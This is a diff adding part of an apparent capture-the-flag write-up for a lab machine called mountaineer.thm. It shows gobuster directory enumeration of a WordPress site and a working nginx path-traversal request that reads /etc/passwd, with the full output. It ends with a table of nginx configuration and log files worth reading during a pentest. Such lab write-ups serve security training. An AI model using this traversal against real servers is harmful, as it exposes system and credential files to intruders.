@@ -21,3 +21,102 @@ nano  /etc/hosts
 10.49.151.94  mountaineer.thm
 ```
 
+<img width="1907" height="870" alt="blog" src="https://github.com/user-attachments/assets/295f1728-6686-469c-84bf-29073bd34315" />
+
+7:11] root@prime ~/ctf/mountain # gobuster dir -u http://mountaineer.thm/wordpress -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt   
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://mountaineer.thm/wordpress
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+images               (Status: 301) [Size: 178] [--> http://mountaineer.thm/wordpress/images/]
+wp-content           (Status: 301) [Size: 178] [--> http://mountaineer.thm/wordpress/wp-content/]
+wp-includes          (Status: 301) [Size: 178] [--> http://mountaineer.thm/wordpress/wp-includes/]
+wp-admin             (Status: 301) [Size: 178] [--> http://mountaineer.thm/wordpress/wp-admin/]
+
+at images have a path traversal so we can read a /etc/passwd file and server important configuration files
+
+```
+[7:48] root@prime ~/ctf/mountain # curl http://mountaineer.thm/wordpress/images../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+vagrant:x:1000:1000:vagrant:/home/vagrant:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+vboxadd:x:998:1::/var/run/vboxadd:/bin/false
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+dovecot:x:115:121:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
+dovenull:x:116:122:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
+manaslu:x:1002:1002::/home/manaslu:/bin/bash
+annapurna:x:1003:1003::/home/annapurna:/bin/bash
+makalu:x:1004:1004::/home/makalu:/bin/bash
+kangchenjunga:x:1006:1006::/home/kangchenjunga:/bin/bash
+postfix:x:117:123::/var/spool/postfix:/usr/sbin/nologin
+everest:x:1010:1010::/home/everest:/bin/bash
+lhotse:x:1011:1011::/home/lhotse:/bin/bash
+nanga:x:1012:1012::/home/nanga:/bin/bash
+k2:x:1013:1013::/home/k2:/bin/bash
+```
+
+
+we know the server is a nginx so we try to enumurate nginx default files and configuration
+
+| File / Path                      | Purpose                                   | Security Relevance                           | What to Check (Pentesting View)                                                        |
+| -------------------------------- | ----------------------------------------- | -------------------------------------------- | -------------------------------------------------------------------------------------- |
+| `/etc/nginx/nginx.conf`          | Main global config file                   | Controls overall behavior of server          | Check for: `user`, `worker_processes`, `include` directives, security headers, logging |
+| `/etc/nginx/conf.d/*.conf`       | Additional config files (modular configs) | Often contains virtual hosts or custom rules | Look for exposed endpoints, misconfigurations, weak access controls                    |
+| `/etc/nginx/sites-available/`    | Stores all site configs                   | Contains full server block definitions       | Check inactive configs → may reveal hidden domains or endpoints                        |
+| `/etc/nginx/sites-enabled/`      | Active sites (symlinked)                  | Actually used configs                        | Focus here for attack surface (real targets)                                           |
+| `/etc/nginx/snippets/`           | Reusable config snippets                  | Security rules often stored here             | Look for reused insecure configs (e.g., weak SSL, bad headers)                         |
+| `/var/log/nginx/access.log`      | Logs all requests                         | Useful for detection & recon                 | Check for sensitive data leakage, tokens, API keys                                     |
+| `/var/log/nginx/error.log`       | Logs server errors                        | May leak internal paths or stack traces      | Look for file paths, backend errors, misconfig clues                                   |
+| `/usr/share/nginx/html/`         | Default web root                          | Static files served                          | Check for exposed files, backups, `.git`, config leaks                                 |
+| `/etc/nginx/mime.types`          | Defines file types                        | Controls how files are served                | Misconfig → file upload bypass (e.g., PHP served as text)                              |
+| `/etc/nginx/fastcgi_params`      | Parameters for PHP-FPM                    | Backend communication                        | Check for parameter injection or misrouting                                            |
+| `/etc/nginx/proxy_params`        | Reverse proxy settings                    | Used when proxying to backend                | Header manipulation issues (`X-Forwarded-*`)                                           |
+| `/etc/nginx/uwsgi_params`        | For Python apps (uWSGI)                   | Backend integration                          | Check for insecure backend exposure                                                    |
+| `/etc/nginx/koi-utf` / `koi-win` | Charset maps                              | Encoding configs                             | Rarely critical, but encoding bugs can be abused                                       |
+| `/etc/nginx/scgi_params`         | For SCGI protocol                         | Backend config                               | Similar to FastCGI risks                                                               |
+
+
+                                                             
+
+
